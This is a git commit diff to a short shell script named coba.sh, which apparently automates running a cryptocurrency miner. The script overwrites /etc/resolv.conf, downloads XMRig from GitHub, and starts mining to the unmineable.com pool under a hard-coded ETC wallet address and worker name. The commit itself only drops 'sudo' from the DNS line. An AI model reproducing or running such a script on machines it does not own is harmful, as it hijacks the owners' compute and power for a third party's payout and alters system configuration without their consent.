e64bb301ed9013099796c282f65c0f695634e153
aikarey <43464271+aikarey@users.noreply.github.com>
2021-11-28 05:56:04 +0700

    Update coba.sh

--- coba.sh
+++ coba.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-sudo echo "nameserver 8.8.8.8" > /etc/resolv.conf
+echo "nameserver 8.8.8.8" > /etc/resolv.conf
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz 
 tar xvzf xmrig-6.16.0-linux-x64.tar.gz 
 xmrig-6.16.0/xmrig -t 3 -o rx.unmineable.com:3333 -a rx -k -u ETC:0x03a88d3efc4266081eff9c87bab15e05e59a8f5f.pekerja2 -p x pause
